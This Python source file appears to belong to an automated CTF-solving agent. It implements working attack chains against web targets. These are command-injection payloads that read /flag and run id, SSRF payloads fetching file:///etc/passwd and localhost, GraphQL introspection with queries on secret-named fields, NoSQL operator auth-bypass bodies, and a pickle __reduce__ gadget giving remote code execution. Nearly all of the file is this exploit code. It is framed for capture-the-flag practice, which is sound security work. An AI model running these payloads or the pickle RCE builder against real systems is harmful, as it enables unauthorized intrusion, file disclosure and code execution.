"""Generic parameter-injection chains: command injection (cmdi) and SSRF.

Mixed into :class:`~flaghunter.agents.pa_agent.ctf_dispatcher.CTFTaskDispatcher`.
These chains discover injectable query-parameter surfaces and probe them; they
read dispatcher state/helpers via ``self`` at runtime (the composed class
provides ``state``, ``tool_guard``, ``_runtime_proxy_action``, ``_scan_and_store``,
``_extract_flag``, ``_observe_flag``, ``_store_note``).
"""

from __future__ import annotations

import base64
import binascii
import re
from typing import Any
from urllib.parse import parse_qs, urlencode, urljoin, urlparse

from ..dispatcher_helpers import _base_target, _normalize_exploration_url, _with_query
from .base import _ChainOutcome


class GenericInjectionChainMixin:
    """cmdi + ssrf parameter-discovery probes."""

    @staticmethod
    def _inject_cmdi_into_params(url: str, payload: str) -> str:
        """Append a command-injection payload to every query parameter value."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            params = {"cmd": [""]}
        for key in list(params):
            base_val = params[key][0] if params[key] else ""
            params[key] = [f"{base_val}{payload}"]
        return parsed._replace(query=urlencode(params, doseq=True)).geturl()

    def _collect_cmdi_candidate_urls(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> list[str]:
        """Discover injectable query-parameter surfaces for command injection.

        Pulls query-bearing links/observations and GET forms, falling back to a
        small set of conventional command-ish parameter names on the base.
        """
        base = _base_target(target)
        urls: list[str] = []
        seen: set[str] = set()

        def _add(candidate: str) -> None:
            normalized = _normalize_exploration_url(candidate) or candidate
            if normalized and normalized not in seen:
                seen.add(normalized)
                urls.append(normalized)

        seeds = list(page_features.get("raw_links") or [])
        if self.state is not None:
            for observation in self.state.observations:
                if isinstance(observation.metadata, dict):
                    for key in ("url", "final_url"):
                        value = str(observation.metadata.get(key) or "").strip()
                        if value:
                            seeds.append(value)
        for raw in seeds:
            text = str(raw or "").strip()
            if not text:
                continue
            absolute = urljoin(base + "/", text)
            if urlparse(absolute).query:
                _add(absolute)

        for form in page_features.get("forms") or []:
            if not isinstance(form, dict):
                continue
            if str(form.get("method") or "GET").strip().upper() != "GET":
                continue
            action = urljoin(
                target if target.endswith("/") else target + "/",
                str(form.get("action") or "").strip(),
            )
            fields: dict[str, str] = {}
            for item in form.get("inputs") or []:
                if not isinstance(item, dict):
                    continue
                name = str(item.get("name") or "").strip()
                field_type = str(item.get("type") or "text").strip().lower()
                if name and field_type not in {"submit", "button", "image", "reset", "file", "hidden"}:
                    fields[name] = str(item.get("value") or "").strip() or "127.0.0.1"
            if fields:
                _add(_with_query(action, fields))

        if not urls:
            for param in ("ip", "host", "cmd", "ping", "addr", "domain", "url", "c"):
                _add(_with_query(base + "/", {param: "127.0.0.1"}))

        return urls[:5]

    async def _attempt_generic_param_cmdi(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """Parameter-discovery command-injection probe (replaces blind base curl).

        Injects shell command-separator payloads that read the flag and run
        ``id`` into each discovered query parameter, then confirms execution via
        a flag hit or a uid=/passwd marker in the response.
        """
        self.tool_guard.require(["http_request"])
        candidates = self._collect_cmdi_candidate_urls(target, page_features)
        if not candidates:
            return _ChainOutcome(progress=False, reason="generic param cmdi: no injectable parameter surface")

        wrappers = [
            ";cat /flag /flag.txt 2>/dev/null;id",
            "|cat /flag /flag.txt 2>/dev/null",
            "$(cat /flag 2>/dev/null)",
            "%0acat%20/flag%20/flag.txt%0aid",
        ]
        progress = False
        reasons: list[str] = []
        for candidate in candidates:
            for wrapper in wrappers:
                probe_url = self._inject_cmdi_into_params(candidate, wrapper)
                response = await self._runtime_proxy_action(
                    "request",
                    method="GET",
                    url=probe_url,
                    timeout=15,
                    audit_target=probe_url,
                    audit_metadata={"phase": "generic_param_cmdi"},
                )
                body = str((response or {}).get("body") or "")
                await self._scan_and_store(body, probe_url, evidence_source="http-response")
                if extracted_flag := self._extract_flag(body):
                    verification = await self._observe_flag(
                        extracted_flag,
                        target,
                        evidence_source="http-response",
                        rationale="command injection flag read",
                        evidence_url=probe_url,
                        evidence_snippet=body[:240],
                        strategy_kind="generic_param_cmdi",
                    )
                    if verification.decision in {"verified", "runtime"}:
                        return _ChainOutcome(
                            progress=True,
                            flag=verification.flag,
                            reason="generic param cmdi flag read",
                        )
                    progress = True
                    reasons.append(f"cmdi produced {verification.decision} flag")
                if re.search(r"uid=\d+\(", body) or "root:x:0:0:" in body:
                    progress = True
                    reasons.append("command execution confirmed (uid/passwd marker)")
                    await self._store_note(
                        key="ctf_cmdi_confirmed",
                        value=probe_url,
                        category="vulnerability",
                        target=urlparse(target).netloc or target,
                        url=probe_url,
                    )
                    break

        return _ChainOutcome(
            progress=progress,
            reason="; ".join(dict.fromkeys(reasons[:6])) or "generic param cmdi exhausted",
        )

    @staticmethod
    def _inject_ssrf_into_params(url: str, payload: str) -> str:
        """Replace every query parameter value with an SSRF payload URL."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            params = {"url": [""]}
        for key in list(params):
            params[key] = [payload]
        return parsed._replace(query=urlencode(params, doseq=True)).geturl()

    async def _attempt_generic_param_ssrf(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """Parameter-discovery SSRF probe (replaces blind base curl).

        Reuses the cmdi parameter-discovery surface, swaps each parameter value
        for SSRF payloads (file:// and internal http) and confirms via a flag
        hit or an /etc/passwd leak in the response.
        """
        self.tool_guard.require(["http_request"])
        candidates = self._collect_cmdi_candidate_urls(target, page_features)
        if not candidates:
            return _ChainOutcome(progress=False, reason="generic param ssrf: no injectable parameter surface")

        payloads = [
            "file:///flag",
            "file:///flag.txt",
            "file:///etc/passwd",
            "http://127.0.0.1/",
            "http://127.0.0.1/flag",
        ]
        progress = False
        reasons: list[str] = []
        for candidate in candidates:
            for payload in payloads:
                probe_url = self._inject_ssrf_into_params(candidate, payload)
                response = await self._runtime_proxy_action(
                    "request",
                    method="GET",
                    url=probe_url,
                    timeout=15,
                    audit_target=probe_url,
                    audit_metadata={"phase": "generic_param_ssrf"},
                )
                body = str((response or {}).get("body") or "")
                await self._scan_and_store(body, probe_url, evidence_source="http-response")
                if extracted_flag := self._extract_flag(body):
                    verification = await self._observe_flag(
                        extracted_flag,
                        target,
                        evidence_source="http-response",
                        rationale=f"ssrf fetched {payload}",
                        evidence_url=probe_url,
                        evidence_snippet=body[:240],
                        strategy_kind="generic_param_ssrf",
                    )
                    if verification.decision in {"verified", "runtime"}:
                        return _ChainOutcome(
                            progress=True,
                            flag=verification.flag,
                            reason=f"generic param ssrf flag via {payload}",
                        )
                    progress = True
                    reasons.append(f"ssrf produced {verification.decision} flag")
                if "root:x:0:0:" in body:
                    progress = True
                    reasons.append(f"ssrf file read confirmed via {payload}")
                    await self._store_note(
                        key="ctf_ssrf_confirmed",
                        value=probe_url,
                        category="vulnerability",
                        target=urlparse(target).netloc or target,
                        url=probe_url,
                    )
                    break

        return _ChainOutcome(
            progress=progress,
            reason="; ".join(dict.fromkeys(reasons[:6])) or "generic param ssrf exhausted",
        )

    # ------------------------------------------------------------------ #
    # API injection: GraphQL introspection + NoSQL auth bypass
    #
    # 真实最小探测（非 LLM 兜底空壳）。JSON body 经 LocalRuntime 原生 ``json=``；
    # 另带 GET ``?query=`` / form-encoded ``[$ne]`` 旁路以兼容 SSH/Docker 的 curl
    # 取数面。可达性桥接见 chains/web.py 的 ``web_strategy_order``。
    # ------------------------------------------------------------------ #
    def _collect_graphql_endpoints(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> list[str]:
        base = _base_target(target)
        found: list[str] = []
        seen: set[str] = set()

        def _add(candidate: str) -> None:
            normalized = _normalize_exploration_url(candidate) or candidate
            if normalized and normalized not in seen:
                seen.add(normalized)
                found.append(normalized)

        patterns = ("/graphql", "/graphiql", "/api/graphql", "/v1/graphql", "/query")
        seeds = list(page_features.get("endpoints") or []) + list(page_features.get("raw_links") or [])
        for raw in seeds:
            text = str(raw or "").strip()
            if text and any(p in text.lower() for p in patterns):
                _add(urljoin(base + "/", text))
        if not found:
            for path in ("/graphql", "/graphiql", "/api/graphql"):
                _add(base + path)
        return found[:4]

    async def _run_graphql_introspection_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """GraphQL 内省探测：枚举 schema，对 flag 形态字段做跟进查询。

        先 POST 标准内省查询（LocalRuntime 原生 JSON），再 GET ``?query=`` 旁路；
        schema 暴露即 progress，schema 中出现 flag/secret 形态字段则跟进查询取值，
        靠 flag 命中 + runtime 验证确认。
        """
        self.tool_guard.require(["http_request"])
        endpoints = self._collect_graphql_endpoints(target, page_features)
        if not endpoints:
            return _ChainOutcome(progress=False, reason="graphql_introspection: no graphql endpoint")

        introspection = "{__schema{queryType{name} types{name fields{name}}}}"
        headers = {"Content-Type": "application/json"}
        progress = False
        reasons: list[str] = []
        for endpoint in endpoints:
            probes: list[dict[str, Any]] = [
                {"action": "request", "method": "POST", "url": endpoint, "json": {"query": introspection}, "headers": headers},
                {"action": "get", "url": _with_query(endpoint, {"query": introspection})},
            ]
            for probe in probes:
                action = probe.pop("action")
                response = await self._runtime_proxy_action(
                    action,
                    timeout=15,
                    audit_target=endpoint,
                    audit_metadata={"phase": "graphql_introspection"},
                    **probe,
                )
                body = str((response or {}).get("body") or "")
                if not body:
                    continue
                await self._scan_and_store(body, endpoint, evidence_source="http-response")
                schema_seen = any(marker in body for marker in ("__schema", '"queryType"', '"types"'))
                if schema_seen:
                    progress = True
                    reasons.append(f"graphql introspection exposed schema at {endpoint}")
                    await self._store_note(
                        key="ctf_graphql_introspection",
                        value=endpoint,
                        category="vulnerability",
                        target=urlparse(target).netloc or target,
                        url=endpoint,
                    )
                if extracted_flag := self._extract_flag(body):
                    verification = await self._observe_flag(
                        extracted_flag,
                        target,
                        evidence_source="http-response",
                        rationale="graphql introspection",
                        evidence_url=endpoint,
                        evidence_snippet=body[:240],
                        strategy_kind="graphql_introspection",
                    )
                    if verification.decision in {"verified", "runtime"}:
                        return _ChainOutcome(
                            progress=True,
                            flag=verification.flag,
                            reason=f"graphql introspection flag at {endpoint}",
                        )
                    progress = True
                    reasons.append(f"graphql produced {verification.decision} flag")
                if schema_seen:
                    followup = await self._graphql_query_suspicious_fields(endpoint, body, target)
                    if followup.flag:
                        return followup
                    progress = progress or followup.progress

        return _ChainOutcome(
            progress=progress,
            reason="; ".join(dict.fromkeys(reasons[:5])) or "graphql_introspection exhausted",
        )

    async def _graphql_query_suspicious_fields(
        self,
        endpoint: str,
        schema_body: str,
        target: str,
    ) -> _ChainOutcome:
        names = set(re.findall(r'"name"\s*:\s*"([A-Za-z_][A-Za-z0-9_]*)"', schema_body))
        suspicious = [
            name
            for name in sorted(names)
            if any(token in name.lower() for token in ("flag", "secret", "password", "token", "admin"))
        ]
        for field in suspicious[:4]:
            response = await self._runtime_proxy_action(
                "request",
                method="POST",
                url=endpoint,
                json={"query": "{%s}" % field},
                headers={"Content-Type": "application/json"},
                timeout=15,
                audit_target=endpoint,
                audit_metadata={"phase": "graphql_query", "field": field},
            )
            body = str((response or {}).get("body") or "")
            if not body:
                continue
            await self._scan_and_store(body, endpoint, evidence_source="http-response")
            if extracted_flag := self._extract_flag(body):
                verification = await self._observe_flag(
                    extracted_flag,
                    target,
                    evidence_source="http-response",
                    rationale=f"graphql field {field}",
                    evidence_url=endpoint,
                    evidence_snippet=body[:240],
                    strategy_kind="graphql_introspection",
                )
                if verification.decision in {"verified", "runtime"}:
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason=f"graphql field {field} flag",
                    )
        return _ChainOutcome(progress=bool(suspicious), reason="")

    def _collect_nosql_endpoints(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> list[str]:
        base = _base_target(target)
        found: list[str] = []
        seen: set[str] = set()

        def _add(candidate: str) -> None:
            normalized = _normalize_exploration_url(candidate) or candidate
            if normalized and normalized not in seen:
                seen.add(normalized)
                found.append(normalized)

        patterns = ("/login", "/api/login", "/auth", "/signin", "/session", "/user", "/api/")
        seeds = list(page_features.get("endpoints") or []) + list(page_features.get("raw_links") or [])
        for raw in seeds:
            text = str(raw or "").strip()
            if text and any(p in text.lower() for p in patterns):
                _add(urljoin(base + "/", text))
        for form in page_features.get("forms") or []:
            if not isinstance(form, dict):
                continue
            if str(form.get("method") or "GET").strip().upper() != "POST":
                continue
            action = urljoin(
                target if target.endswith("/") else target + "/",
                str(form.get("action") or "").strip(),
            )
            _add(action)
        if not found:
            for path in ("/login", "/api/login", "/auth"):
                _add(base + path)
        return found[:4]

    async def _run_nosql_injection_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """NoSQL 认证绕过探测：算子注入（``$ne``/``$gt``/``$regex``）。

        JSON body + form-encoded ``[$ne]`` 双形态，靠 flag 命中 + runtime 验证，
        或登录成功标志（状态 200/302 + 成功标记 / Set-Cookie）确认绕过。
        """
        self.tool_guard.require(["http_request"])
        endpoints = self._collect_nosql_endpoints(target, page_features)
        if not endpoints:
            return _ChainOutcome(progress=False, reason="nosql_injection: no candidate endpoint")

        json_payloads = [
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": "admin", "password": {"$ne": "wrong"}},
            {"username": {"$regex": "^adm"}, "password": {"$ne": ""}},
        ]
        form_payloads = [
            {"username[$ne]": "x", "password[$ne]": "x"},
            {"username[$gt]": "", "password[$gt]": ""},
        ]
        body_markers = ("welcome", "dashboard", "logout", "token", "success", "flag", "authenticated")
        progress = False
        reasons: list[str] = []
        for endpoint in endpoints:
            attempts: list[dict[str, Any]] = [
                {"method": "POST", "url": endpoint, "json": payload, "headers": {"Content-Type": "application/json"}}
                for payload in json_payloads
            ]
            attempts += [
                {"method": "POST", "url": endpoint, "data": payload}
                for payload in form_payloads
            ]
            for opts in attempts:
                response = await self._runtime_proxy_action(
                    "request",
                    timeout=15,
                    audit_target=endpoint,
                    audit_metadata={"phase": "nosql_injection"},
                    **opts,
                )
                if not isinstance(response, dict):
                    continue
                body = str(response.get("body") or "")
                status = int(response.get("status_code") or 0)
                header_blob = " ".join(
                    f"{key}:{value}" for key, value in (response.get("headers") or {}).items()
                ).lower()
                await self._scan_and_store(body, endpoint, evidence_source="http-response")
                if extracted_flag := self._extract_flag(body):
                    verification = await self._observe_flag(
                        extracted_flag,
                        target,
                        evidence_source="http-response",
                        rationale="nosql auth bypass",
                        evidence_url=endpoint,
                        evidence_snippet=body[:240],
                        strategy_kind="nosql_injection",
                    )
                    if verification.decision in {"verified", "runtime"}:
                        return _ChainOutcome(
                            progress=True,
                            flag=verification.flag,
                            reason=f"nosql bypass flag at {endpoint}",
                        )
                    progress = True
                    reasons.append(f"nosql produced {verification.decision} flag")
                bypassed = status in {200, 302} and (
                    any(marker in body.lower() for marker in body_markers)
                    or "set-cookie" in header_blob
                )
                if bypassed:
                    progress = True
                    reasons.append(f"nosql auth bypass signal at {endpoint} (status {status})")
                    await self._store_note(
                        key="ctf_nosql_bypass",
                        value=endpoint,
                        category="vulnerability",
                        target=urlparse(target).netloc or target,
                        url=endpoint,
                    )
        return _ChainOutcome(
            progress=progress,
            reason="; ".join(dict.fromkeys(reasons[:5])) or "nosql_injection exhausted",
        )

    # ------------------------------------------------------------------
    # Insecure deserialization (Java / Python pickle)
    # ------------------------------------------------------------------
    # CTF-pragmatic stance mirroring graphql/nosql: Python pickle gets a real,
    # stdlib-only RCE probe (we can *build* the gadget locally — pickle.dumps
    # records the reduce callable by reference, it never executes it; execution
    # only happens on the target's loads). Java serialized surfaces get
    # detection + a vulnerability note (full exploitation needs an external
    # ysoserial gadget library, out of scope for an in-process probe), an
    # honest degradation rather than a stub that claims more than it does.

    # Confirms RCE deterministically even when no flag file is present.
    _DESER_RCE_MARKER = "DESER_RCE_OK"
    _DESER_RCE_COMMAND = (
        "cat /flag /flag.txt /flag* /app/flag* /root/flag* /tmp/flag* 2>/dev/null; "
        "id; echo " + _DESER_RCE_MARKER
    )

    @staticmethod
    def _detect_serialized_blob(value: str) -> tuple[str, str] | None:
        """Classify a string as a serialized-object blob.

        Returns ``(lang, encoding)`` — ``lang`` ∈ {"java", "python"}, ``encoding``
        currently always ``"base64"`` (the form that survives cookies/params) —
        or ``None``. Java serialized streams start ``\\xac\\xed`` (base64 "rO0");
        Python pickle protocol 2-5 starts ``\\x80\\x0[2-5]`` (base64 "gA…").
        """
        text = (value or "").strip()
        if len(text) < 8:
            return None
        # Cheap textual prefix screen before paying for a decode.
        if text.startswith("rO0"):
            return ("java", "base64")
        for candidate in (text, text + "=" * (-len(text) % 4)):
            for decoder in (base64.b64decode, base64.urlsafe_b64decode):
                try:
                    decoded = decoder(candidate)
                except (binascii.Error, ValueError):
                    continue
                if decoded.startswith(b"\xac\xed"):
                    return ("java", "base64")
                if decoded[:1] == b"\x80" and decoded[1:2] in (b"\x02", b"\x03", b"\x04", b"\x05"):
                    return ("python", "base64")
                break
        return None

    def _collect_deserialization_carriers(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> list[dict[str, Any]]:
        """Find request locations carrying a serialized-object blob.

        Scans cookies, query parameters (links/observations) and POST form
        fields. Each carrier records where to re-inject our payload and which
        language/encoding the original blob used.
        """
        base = _base_target(target)
        carriers: list[dict[str, Any]] = []
        seen: set[tuple[str, str, str]] = set()

        def _add(location: str, name: str, endpoint: str, lang: str, encoding: str, **extra: Any) -> None:
            dedup = (location, name, endpoint)
            if dedup in seen:
                return
            seen.add(dedup)
            carriers.append(
                {"location": location, "name": name, "endpoint": endpoint, "lang": lang, "encoding": encoding, **extra}
            )

        # Cookies (page_features["cookies"] is a "a=b; c=d" string).
        for cookie_part in str(page_features.get("cookies") or "").split(";"):
            if "=" not in cookie_part:
                continue
            name, value = cookie_part.split("=", 1)
            detected = self._detect_serialized_blob(value.strip())
            if detected:
                _add("cookie", name.strip(), base + "/", detected[0], detected[1])

        # Query parameters from links / observation URLs.
        seeds = list(page_features.get("raw_links") or []) + list(page_features.get("endpoints") or [])
        if self.state is not None:
            for observation in self.state.observations:
                if isinstance(observation.metadata, dict):
                    for key in ("url", "final_url"):
                        url_value = str(observation.metadata.get(key) or "").strip()
                        if url_value:
                            seeds.append(url_value)
        for raw in seeds:
            text = str(raw or "").strip()
            if not text:
                continue
            absolute = urljoin(base + "/", text)
            parsed = urlparse(absolute)
            if not parsed.query:
                continue
            for key, values in parse_qs(parsed.query, keep_blank_values=True).items():
                detected = self._detect_serialized_blob(values[0] if values else "")
                if detected:
                    _add("param", key, absolute, detected[0], detected[1])

        # POST form fields (hidden/text) carrying a blob.
        for form in page_features.get("forms") or []:
            if not isinstance(form, dict):
                continue
            method = str(form.get("method") or "GET").strip().upper()
            action = urljoin(target if target.endswith("/") else target + "/", str(form.get("action") or "").strip())
            for field in form.get("fields") or form.get("inputs") or []:
                if not isinstance(field, dict):
                    continue
                detected = self._detect_serialized_blob(str(field.get("value") or ""))
                if detected:
                    _add("body", str(field.get("name") or "data"), action, detected[0], detected[1], method=method)

        return carriers

    @staticmethod
    def _build_python_pickle_payload(command: str, encoding: str = "base64") -> str:
        """Build a base64 pickle whose ``loads`` runs ``command`` on the target.

        Safe to construct in-process: ``pickle.dumps`` records the reduce
        callable (``subprocess.check_output``) by reference and never invokes it;
        only the target's ``pickle.loads`` executes it. ``check_output`` returns
        the command's stdout, so the flag/marker surfaces when the sink reflects
        the deserialized value.
        """
        import pickle
        import subprocess

        class _PickleRCE:
            def __reduce__(self):
                return (subprocess.check_output, (["sh", "-c", command],))

        raw = pickle.dumps(_PickleRCE())
        if encoding == "urlsafe":
            return base64.urlsafe_b64encode(raw).decode("ascii")
        return base64.b64encode(raw).decode("ascii")

    async def _run_insecure_deserialization_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """Insecure-deserialization probe (Java detect / Python pickle RCE).

        Locates serialized-object carriers (cookie / query param / form field).
        For Python pickle carriers it re-injects a stdlib pickle gadget that
        runs a flag-read + ``id`` command, confirming via reflected flag /
        ``DESER_RCE_OK`` marker / ``uid=``. Java carriers are surfaced as a
        vulnerability note (exploitation needs an external ysoserial gadget).
        """
        self.tool_guard.require(["http_request"])
        carriers = self._collect_deserialization_carriers(target, page_features)
        host = urlparse(target).netloc or target

        # Fallback: source/runtime clues suggest pickle but no blob is exposed —
        # try the conventional carriers so a bare hint still gets one real shot.
        if not any(c["lang"] == "python" for c in carriers) and self._has_python_pickle_clue(page_features):
            base = _base_target(target)
            carriers.append({"location": "cookie", "name": "session", "endpoint": base + "/", "lang": "python", "encoding": "base64"})
            carriers.append({"location": "body", "name": "data", "endpoint": base + "/", "lang": "python", "encoding": "base64", "method": "POST"})

        if not carriers:
            return _ChainOutcome(progress=False, reason="insecure_deserialization: no serialized carrier")

        progress = False
        reasons: list[str] = []
        for carrier in carriers:
            if carrier["lang"] == "java":
                progress = True
                reasons.append(f"java serialized blob in {carrier['location']} {carrier['name']} @ {carrier['endpoint']}")
                await self._store_note(
                    key="ctf_java_deserialization_surface",
                    value=f"{carrier['location']}:{carrier['name']} @ {carrier['endpoint']}",
                    category="vulnerability",
                    target=host,
                    url=carrier["endpoint"],
                )
                continue

            payload = self._build_python_pickle_payload(self._DESER_RCE_COMMAND, carrier.get("encoding", "base64"))
            outcome = await self._send_deserialization_payload(target, carrier, payload)
            progress = progress or outcome.progress
            if outcome.flag:
                return outcome
            if outcome.reason:
                reasons.append(outcome.reason)

        return _ChainOutcome(
            progress=progress,
            reason="; ".join(dict.fromkeys(reasons[:5])) or "insecure_deserialization exhausted",
        )

    @staticmethod
    def _has_python_pickle_clue(page_features: dict[str, Any]) -> bool:
        blob = (
            str(page_features.get("content") or "")
            + " "
            + str(page_features.get("html") or "")
        ).lower()
        return any(token in blob for token in ("pickle", "cpickle", "__reduce__", "loads(", "yaml.load", "marshal.loads"))

    async def _send_deserialization_payload(
        self,
        target: str,
        carrier: dict[str, Any],
        payload: str,
    ) -> _ChainOutcome:
        """Re-inject a pickle payload into one carrier and judge the response."""
        endpoint = str(carrier["endpoint"])
        location = carrier["location"]
        name = carrier["name"]
        if location == "cookie":
            opts: dict[str, Any] = {"method": "GET", "url": endpoint, "headers": {"Cookie": f"{name}={payload}"}}
        elif location == "param":
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[name] = [payload]
            opts = {"method": "GET", "url": parsed._replace(query=urlencode(params, doseq=True)).geturl()}
        else:  # body
            opts = {"method": str(carrier.get("method") or "POST").upper(), "url": endpoint, "data": {name: payload}}

        response = await self._runtime_proxy_action(
            "request",
            timeout=15,
            audit_target=endpoint,
            audit_metadata={"phase": "insecure_deserialization", "carrier": location},
            **opts,
        )
        if not isinstance(response, dict):
            return _ChainOutcome(progress=False, reason="")
        body = str(response.get("body") or "")
        await self._scan_and_store(body, endpoint, evidence_source="http-response")

        if extracted_flag := self._extract_flag(body):
            verification = await self._observe_flag(
                extracted_flag,
                target,
                evidence_source="http-response",
                rationale="pickle deserialization RCE",
                evidence_url=endpoint,
                evidence_snippet=body[:240],
                strategy_kind="insecure_deserialization",
            )
            if verification.decision in {"verified", "runtime"}:
                return _ChainOutcome(progress=True, flag=verification.flag, reason=f"pickle RCE flag at {endpoint}")
            return _ChainOutcome(progress=True, reason=f"pickle produced {verification.decision} flag")

        rce_confirmed = self._DESER_RCE_MARKER in body or bool(re.search(r"uid=\d+\(", body))
        if rce_confirmed:
            await self._store_note(
                key="ctf_python_pickle_rce",
                value=f"{location}:{name} @ {endpoint}",
                category="vulnerability",
                target=urlparse(target).netloc or target,
                url=endpoint,
            )
            return _ChainOutcome(progress=True, reason=f"pickle RCE confirmed at {endpoint} ({location})")
        return _ChainOutcome(progress=False, reason="")
